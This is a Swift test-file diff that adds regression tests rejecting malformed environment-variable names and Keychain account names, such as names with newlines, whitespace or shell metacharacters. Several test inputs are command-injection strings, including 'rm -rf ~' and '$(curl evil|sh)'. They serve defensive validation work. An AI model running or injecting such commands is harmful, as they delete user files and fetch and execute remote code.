@@ -393,6 +393,42 @@ struct EnvVarNameTests {
         #expect(!EnvVarName.isValid("1leading"))
         #expect(!EnvVarName.isValid(""))
     }
+
+    @Test("Names with embedded newlines are rejected (anchors match whole string, not line)")
+    func rejectsMultilineNames() {
+        // ^/$ が行アンカーとして働くと "A\nB" の "A" 行がマッチしてしまう。
+        // 文字列全体アンカーであることを担保する回帰テスト。
+        #expect(!EnvVarName.isValid("A\nB"))
+        #expect(!EnvVarName.isValid("SAFE\nEVIL; rm -rf ~"))
+        #expect(!EnvVarName.isValid("SAFE\n"))
+    }
+
+    @Test("isValid does not trim: surrounding whitespace makes a name invalid")
+    func doesNotTrim() {
+        // isValid(x) が true なら「x そのもの」が安全、という不変条件を担保。
+        #expect(!EnvVarName.isValid(" MY_KEY "))
+        #expect(!EnvVarName.isValid("MY_KEY "))
+        #expect(EnvVarName.isValid("MY_KEY"))
+    }
+}
+
+@Suite("KeychainService sink validation Tests (#116)")
+struct KeychainServiceSinkValidationTests {
+
+    @Test("save rejects an invalid account name before touching the Keychain")
+    func saveRejectsInvalidAccount() {
+        // ガードは SecItem 呼び出し前に throw するため、実 Keychain に触れずに検証できる。
+        // 外部由来（共有ファイル等）の不正な名前がどの ingress からでも書き込まれないこと。
+        #expect(throws: KeychainError.self) {
+            try KeychainService.shared.save(value: "x", for: "EVIL\"; rm -rf ~; #")
+        }
+        #expect(throws: KeychainError.self) {
+            try KeychainService.shared.save(value: "x", for: "has space")
+        }
+        #expect(throws: KeychainError.self) {
+            try KeychainService.shared.save(value: "x", for: "X=x $(curl evil|sh)")
+        }
+    }
 }
 
 @Suite("EnvParser key validation Tests (#116)")
